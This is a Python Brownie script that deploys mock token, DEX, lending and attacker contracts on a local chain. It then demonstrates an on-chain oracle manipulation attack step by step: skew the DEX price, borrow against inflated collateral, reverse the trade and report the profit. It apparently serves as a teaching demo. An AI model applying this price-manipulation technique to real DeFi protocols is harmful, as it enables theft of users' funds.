from brownie import accounts, etherToken, usdToken, Loaner,exploiter,Dex, chain
from brownie.network import priority_fee
from rich import print as rp

def main():
    priority_fee('auto')
    eth=etherToken.deploy({'from':accounts[0]})
    usd=usdToken.deploy({'from':accounts[0]})
    dex=Dex.deploy(eth,usd,{'from':accounts[0]})
    lender=Loaner.deploy(eth,usd,{'from':accounts[0]})
    atk=exploiter.deploy(eth,usd,dex,lender,{'from':accounts[0]})
    beforeusd=usd.balanceOf(atk)
    beforeeth=eth.balanceOf(atk)
    rp('[bold green]------ Exploit: On chain Oracle Manipulation Attack ------------[/]')
    rp('[bold green]------> Step 1: Buy 500 ether tokens using 2000 usd tokens from dex, initial price of dex is 4 usd token for 1 ether token')
    Usdprice=float(eth.balanceOf(dex)/usd.balanceOf(dex))
    atk.buyeth(2000)
    rp(f'[bold]current rate per usd token is: [/] {Usdprice}')
    dex.tradeEth(atk,2000*Usdprice)
    Usdprice=float(eth.balanceOf(dex)/usd.balanceOf(dex))
    rp(f'[bold]new rate per usd token is: [/] {Usdprice} after buying out ether token using usd token')
    rp('[bold green]------> Step 2: Borrow Y amount of usd tokens by using 1000 ether token as collateral from a lending platform')
    Ethprice=float(usd.balanceOf(dex)/eth.balanceOf(dex))
    atk.borrowusd(1000)
    lender.lendusd(atk,1000*Ethprice*0.67)
    rp('[bold green]------> Step 3: Reverse trade made in step 1, sell 500 worth of ether tokens back for 2000 usd tokens')
    atk.selleth(500)
    dex.tradeUSD(atk,2000)
    profitusd=usd.balanceOf(atk)-beforeusd
    losseth=beforeeth-eth.balanceOf(atk)
    rp(f'[bold]gained [/] {profitusd} usd tokens for {losseth} of eth tokens which is {profitusd/losseth} compared to current oracle rate of {usd.balanceOf(dex)/eth.balanceOf(dex)} per eth token')

